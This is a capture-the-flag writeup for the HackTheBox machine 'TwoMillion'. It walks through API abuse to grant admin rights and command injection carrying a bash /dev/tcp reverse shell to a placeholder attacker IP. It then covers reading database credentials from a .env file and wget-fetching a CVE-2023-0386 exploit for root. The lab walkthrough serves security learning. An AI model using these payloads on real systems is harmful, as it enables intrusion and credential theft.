---
title: "Exploiting APIs in HackTheBox: TwoMillion"
description: 'The HackTheBox challenge "TwoMillion" involved a little bit of everything, but plenty of API exploitation. The hardest part is simply finding the vulnerabilities, but this challenge offers a guided mode which gives you leads to follow.'
date: 2026-03-24 # Optional: HH:MM:SS +/-TTTT
categories: [Writeups, HackTheBox]
tags: [easy, web, api, javascript, trialanderror]     # TAG names should always be lowercase
media_subpath: /assets/img/posts/Writeups/HackTheBox/TwoMillion
# Docs: https://chirpy.cotes.page/posts/write-a-new-post/
---
## Getting User
### Reconnaissance
1. Nmap scan result:

| Port | Protocol | Service |
| :--- | :------- | :------ |
| 22   | TCP      | SSH     |
| 80   | TCP      | HTTP    |

2. Need 2million.htb in /etc/hosts

3. On website, a button leads to 2million.htb/invite

![inviteButton](inviteButton.png) <Update to assets folder later>

### Interesting File
4. The /invite page loads a JavaScript file named inviteapi.min.js which can be read in Firefox's Debugger.

![Obfuscated JavaScript](obfCode.png)

5. The JavaScript code is obfuscated (as if it wasn't unreadable enough). To deobfuscate, use [de4js](https://lelinhtinh.github.io/de4js/). This is the result:

```javascript
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

6. We can call these functions in the browser console. Calling makeInviteCode returns a string encrypted with ROT13:

```javascript
Object { 0: 200, success: 1, data: {…}, hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..." }
​
data: Object { data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr", enctype: "ROT13" }
```

7. Using ROT13 on Cyberchef with (default) key 13: Message decrypts to `In order to generate the invite code, make a POST request to /api/v1/invite/generate`

8. There are multiple ways to do this: See [StackOverflow post](https://stackoverflow.com/questions/4797534/how-to-manually-send-http-post-requests-from-firefox-or-chrome-browser). However, I will send directly from Firefox:
    1. Go to Network tab
    2. Find any prior POST request and right-click
    3. Edit and resend

9.  Sending the request to `/api/v1/invite/generate` yields the following:

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "R0laVE4tVzE4U0ctRjVWWEctSDRVSjM=",
    "format": "encoded"
  }
}
```

10. The equal sign at the end gives away that this is base64
  - Decoded: `GIZTN-W18SG-F5VXG-H4UJ3`

11. Pasting in the code: We are gifted a registration page:

![Registration Page](registration.png)

### We Registered
12. I set up an account:
  - Username: encryptstar 
  - Email: es@htb.org
  - Password: password

13. I now have access to the site.

![The site](theSite.png))

14.  Clicking on "Access" in the left sidebar allows us to download an openvpn connection pack.
    - This is not directly useful, but we see it uses API to download the pack.
15.  Sending GET request to `/api/v1` using the same Firefox trick, we see there are 3 API calls under "admin":

```json
"admin": {
    "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
    },
    "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
    },
    "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
    }
}
```

16.  First we want to set our user to admin via `/api/v1/admin/settings/update` so we can use the POST request. This takes a bit of trial and error:
    1. Sending an empty PUT request yields this error:

    ```json
    {
        "status": "danger",
        "message": "Invalid content type."
    }
    ```

    2. It likely wants a message in JSON. To indicate this, we want to add a `Content-Type: application/json` header to our request. In Firefox, you can do it in the New Request box:

    ![Add Content-Type](newHeader.png)

    3. Sending this PUT request yields this error:

    ```json
    {
        "status": "danger",
        "message": "Missing parameter: email"
    }
    ```

    4. This means the message needs to have a JSON block in the PUT request body and it needs to have an "email" parameter (this likely should be my own):

    ```json
    {
        "email": "es@htb.org"
    }
    ```

    5. Sending this PUT request yields this error:

    ```json
    {
        "status": "danger",
        "message": "Missing parameter: is_admin"
    }
    ```

    6. The `is_admin` parameter is likely a boolean which I certainly want set to `true`. So here's our new request:

    ```json
    {
        "email": "es@htb.org",
        "is_admin": true
    }
    ```

    7. Got an error for using true instead of 1, so I simply replace `true` for `1` for our final request:

    ```json
    {
        "email": "es@htb.org",
        "is_admin": 1
    }
    ```

17.  Lets verify we are indeed admin using a GET request to `/api/v1/admin/auth`. We got `message: true`!

![We Admin Baby!](adminLetsGo.png)

### We Admin
18. We need to set PUT to POST in the New Request field and use `/api/v1/admin/vpn/generate`.

![New Request](newRequest.png)

19.  After trial and error, this is the body request that seems to work:

```json
{
	"username": "encryptstar"
}
```

20. This API call is likely vulnerable to command injection since it's interacting with the system. Lets set up a reverse shell:
    1. Run `nc -lvnp 6666` on the local system to listen for connections.
    2. In the JSON, inject a command like this:

    ```json
    {
        "username": "encryptstar;  /bin/bash -c '/bin/bash -i >& /dev/tcp/<HACKER_IP>/<HACKER_PORT> 0>&1'"
    }
    ```

    3. The semicolon marks the username as the end of the command and `/bin/bash -c '/bin/bash -i >& /dev/tcp/<HACKER_IP>/<HACKER_PORT> 0>&1'` as a new command to chain with it.

### We Shell
21. Now we have a shell into the system! But we still don't got the user flag.
22. However, passwords are normally stored in environment variables, which PHP usually stores in `.env`
    1. Running `find / -name .env 2>/dev/null` returns `/var/www/html/.env`
    2. This file has a username and password!

    ```
    DB_HOST=127.0.0.1
    DB_DATABASE=htb_prod
    DB_USERNAME=admin
    DB_PASSWORD=SuperDuperPass123
    ```
    {: file='/var/www/html/.env'}

23. With `admin` and `SuperDuperPass123`, we can ssh as admin! User flag acquired!

## Getting Root
24. Although the vulnerability could be found using [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS), there is an email at `/var/mail/admin` which describes a vulnerability with OverlaysFS / FUSE.
    - This vulnerability is CVE-2023-0386
    - The Proof-of-Concept I found is [here](https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c)
25. Just need to compile the binary and have the target fetch my binary:
    1. Download the PoC
    2. Launch an http-server in the same directory as the PoC
    3. Use `wget http://<HACKER_IP>/poc.c` on the target to download it.
    4. Compile and run it
26. Root acquired!
